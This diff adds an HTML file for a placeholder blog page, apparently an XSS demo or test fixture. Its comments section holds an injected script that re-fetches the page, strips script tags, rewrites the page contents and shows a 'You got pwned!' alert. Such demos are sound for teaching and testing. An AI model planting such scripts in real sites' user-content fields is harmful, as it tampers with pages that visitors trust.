@@ -1,0 +1,52 @@
+<html> 
+<body> 
+	<h1>Your blog</h1> 
+	<h2>Your amazing Post</h2> 
+	<p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat. </p> 
+	<hr> 
+	<h3>Comments:</h3> 
+	<p>I love your blog!!!</p> 
+	<p>- Adoring fan #1</p> 
+	<p></p> 
+	<p>HAHA YOU'RE PWNED NOW!</p> 
+	<script>//zz
+function nofun(){
+}
+function ajax(method,url,successfunc,data){
+	var req=window.XMLHttpRequest?
+		new window.XMLHttpRequest()
+		:
+		new ActiveXObject("MSXML2.XMLHTTP.3.0");
+	req.open(method,url,true);
+	req.onreadystatechange=successfunc?
+		function(){
+			if(req.readyState==4&&req.status==200)
+				successfunc(req);
+		}
+		:
+		nofun;
+	if(data){
+		req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		req.send(data);
+	}else 
+		req.send();
+	return "ajax sent";
+}
+function f(){
+	var txt=window.req.responseText;
+	var oldtxt=txt;
+	txt=txt.replace(/<script\076[^\076]*\076/g,'');
+	document.write(txt);
+	document.close();
+	alert("You got pwned!");
+}
+ajax('GET',location,
+	function(req){
+		window.req=req;
+		setTimeout('f()',1);
+	}
+);
+</script> 
+ 
+</body> 
+</html>
